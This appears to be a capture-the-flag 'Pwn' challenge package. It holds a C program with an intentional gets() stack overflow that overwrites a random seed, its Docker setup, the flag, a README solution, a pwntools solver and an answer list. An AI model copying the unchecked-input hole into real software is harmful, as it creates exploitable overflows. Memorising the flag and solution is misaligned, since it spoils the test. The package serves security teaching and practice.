{
    "ans.txt": "89384\n30887\n92778\n36916\n47794\n38336\n85387\n60493\n16650\n41422\n2363\n90028\n68691\n20060\n97764\n13927\n80541\n83427\n89173\n55737\n5212\n95369\n2568\n56430\n65783\n21531\n22863\n65124\n74068\n3136\n13930\n79803\n34023\n23059\n33070\n98168\n61394\n18457\n75012\n78043\n76230\n77374\n84422\n44920\n13785\n98538\n75199\n94325\n98316\n64371\n66414\n3527\n76092\n68981\n59957\n41874\n6863\n99171\n6997\n97282\n2306\n20926\n77085\n36328\n60337\n26506\n50847\n21730\n61314\n25858\n16125\n53896\n19583\n546\n98815\n33368\n15435\n90365\n44044\n13751\n71088\n26809\n17277\n47179\n95789\n93585\n5404\n2652\n92755\n12400\n99933\n95061\n49677\n93369\n47740\n10013\n36227\n98587\n48095\n97540\n",
    "Dockerfile": "FROM debian:buster-slim as build\n\nRUN apt update; apt -y install build-essential\n\nCOPY troll.c /tmp/troll.c\nRUN gcc -o /tmp/troll -fno-stack-protector /tmp/troll.c\n\nFROM debian:buster-slim\n\nenv DEBIAN_FRONTEND=\"noninteractive\"\n\nRUN apt-get update && apt-get install socat -y\n\nRUN groupadd ctf\n\nRUN mkdir /pwn\n\nCOPY --from=build /tmp/troll /pwn/troll\nCOPY flag.txt /pwn/flag.txt\nCOPY start.sh /pwn/start.sh\n\nRUN useradd -G ctf --home=/pwn pwnuser\n\nRUN chown -R pwnuser /pwn\nRUN chmod -R 555 /pwn\n\nEXPOSE 4765\n\nENTRYPOINT [\"/pwn/start.sh\"]\n",
    "flag.txt": "gigem{Y0uve_g0ne_4nD_!D3fe4t3d_th3_tr01L!}\n",
    "README.md": "## Description\n\nThere's a troll who thinks his challenge won't be solved until the heat death of the universe.\n\n## Documentation\n\nBasic stack overflow rand seed challenge.\n\n### Setup\n\n1. docker build . -t troll\n2. docker run --rm -it -p 4765:4765 troll\n\n## Solution\n\nOverflow the name string to overwrite the seed, then predict correctly. Just\nwrite your own code that prints the first 100 numbers from whatever seed you give.\nThis is implemented in `solver.py` and `zeroseed.c`.\n\nCould also maybe overwrite RIP to flag printing code but that's extra.\n",
    "solver.py": "from pwn import *\n\nr = remote('127.0.0.1', 4765)\n\nr.recvuntil(\"Who goes there?\\n\")\nr.send(\"\\x00\"*0x50 + \"\\n\")\n\nnums = open('ans.txt', 'r').readlines()\nfor i in range(100):\n    print(r.recvuntil(\"it?\\n\"))\n    r.send(nums[i])\n\nprint(r.recv())\n",
    "start.sh": "#!/bin/bash\n\nwhile : \ndo\n    su -c \"exec socat TCP-LISTEN:4765,reuseaddr,fork EXEC:/pwn/troll,stderr\" - pwnuser;\ndone\n",
    "troll.c": "#include <unistd.h>\n#include <stdio.h>\n#include <stdlib.h>\n#include <time.h>\n\nint main() {\n  setvbuf(stdout,_IONBF,0,0);\n\n  time_t seed = time(NULL);\n  int i, number, response;\n  char name[32], flag[64];\n  FILE *flagfile;\n  \n  printf(\"Who goes there?\\n\");\n\n  gets(name);\n  \n  printf(\"Welcome to my challenge, %s. No one has ever succeeded before. Will you be the first?\\n\", name);\n\n  srand(seed);\n  for (i = 0; i < 100; i++) {\n    number = rand() % 100000 + 1;\n    printf(\"I am thinking of a number from 1-100000. What is it?\\n\");\n    scanf(\"%d\", &response);\n\n    if (response == number) {\n      printf(\"Impressive.\\n\");\n    } else {\n      printf(\"You have failed. Goodbye.\\n\");\n      return 0;\n    }\n  }\n\n  printf(\"You've guessed all of my numbers. Here is your reward.\\n\");\n\n  flagfile = fopen(\"flag.txt\",\"r\");\n  if(flagfile != NULL) {\n    fgets(flag, 64, flagfile);\n    printf(\"%s\\n\", flag);\n  }\n\n  printf(\"Goodbye.\\n\");\n}\n",
    "zeroseed.c": "#include <stdio.h>\n\nint main() {\n  srand(0);\n  for (int i = 0; i < 100; i++) {\n    printf(\"%d\\n\", rand() % 100000 + 1);\n  }\n}\n",
    "category": "Pwn"
}